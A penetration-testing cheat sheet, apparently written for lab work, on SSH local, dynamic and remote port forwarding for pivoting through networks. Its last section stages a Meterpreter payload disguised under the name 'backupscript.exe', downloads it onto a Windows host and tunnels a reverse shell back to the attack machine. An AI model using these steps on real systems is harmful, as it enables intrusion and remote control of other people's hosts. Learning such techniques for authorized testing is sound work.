---
description: This is more of a cheat sheet for commands.
---

# SSH



## Local Port Forwarding

### Local Port Forwarding

```bash
 ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
```

Opens a listener on local port 1234 (our machine) and sends all traffic to remote port 3306 (10.129.202.64).

### Forwarding multiple ports

```bash
 ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```

This SSH command connects to a remote machine and sets up two local port forwards:

1. Local port 1234 forwards to port 3306 on the remote machine (typically MySQL).
2. Local port 8080 forwards to port 80 on the remote machine (typically HTTP).

### Local Port Forwarding Example

<figure><img src="../../.gitbook/assets/Screenshot 2023-10-03 194415.png" alt=""><figcaption></figcaption></figure>

```bash
jumphost@ubuntu ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

Opens a listener on port 4455 (CONFULENCE01 Jump Host) and forwards all traffic through 10.4.50.215 to 172.16.50.217:445. (PGDATABASE01).

_<mark style="color:red;">**NOTE**</mark>_: **-N** flag is means execute no remote commands. When we use this, we will not get any response back.

## Dynamic Port Forwarding - SSH Tunneling over SOCKS proxy

Local port forwarding is limited to one socket per SSH connection. OpenSSH allows for dynamic port forwarding. From a single listening port, packets can be forwarded to any socket that the server has access to.

_**Attack hosts starts the SSH client via Dynamic Port Forward:**_

```bash
ssh -D 9050 ubuntu@10.129.202.64
```

_<mark style="color:red;">**NOTE:**</mark>_ The **-D** flag enables dynamic port forwarding & ssh acts as a SOCKS server.

_**Next we need a tool that can route any tool's packets over the specified port. We will use proxychains.**_

Proxychains is often used to force an application's `TCP traffic` to go through hosted proxies like `SOCKS4`/`SOCKS5`, `TOR`, or `HTTP`/`HTTPS` proxies.

We add socks4 _**127.0.0.1 9050**_ to our proxychains.conf file

```bash
$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

_**Now we can start Nmap with proxychains. By specifying proxychains it forwards all packets over SSH to the 172.16.5.0/23 network**_

```bash
proxychains nmap -v -sn 172.16.5.1-200
```

_<mark style="color:red;">**NOTE:**</mark>_ proxychains only understands full TCP connections. So partial packets like half connect scans will not work. Additionally host-alive checks will not work as Windows Defender blocks ICMP requests (simple pings) by default.

### Using tools with Proxychains:

_**Msfconsole:**_

```bash
proxychains msfconsole
```

_**xfreerdp:**_

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```



### Remote / Reverse Port Forwarding

Say we have a shell on an ubuntu server running on  the same network as us. We want to open a meterpreter payload on the windows host on a different network that we have rdp access to so we can execute low-level windows api functions.&#x20;

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-07 163608.png" alt=""><figcaption><p>Windows host is located on a different network than our jump host</p></figcaption></figure>

In this case we'll configure our reverse connection for the payload to our Ubuntu server's IP. (10.10.201.2). We will use port 8080 on the Ubuntu server to forward all packets back to our attack hosts' 8000 port.

```bash
 

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

_**Configuring & Starting multi/handler**_

```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

_**We can copy our payload to the ubuntu server:**_

```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

_**Then start a http server to serve the file to the windows machine we have rdp access to**_

```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

_**On the windows machine we can fetch the file from our ubuntu server**_

```powershell
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

\
_**Finally, we can SSH remote port forward to our msfconsole listener service on port 8000 & the ubuntu server's port 8080.**_&#x20;

```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

The -R command asks the Ubuntu server to listen on \<targetIpAddress>:8080 and forward all incoming connections to our meterpreter listener on 0.0.0.0:8000 of our attack host.



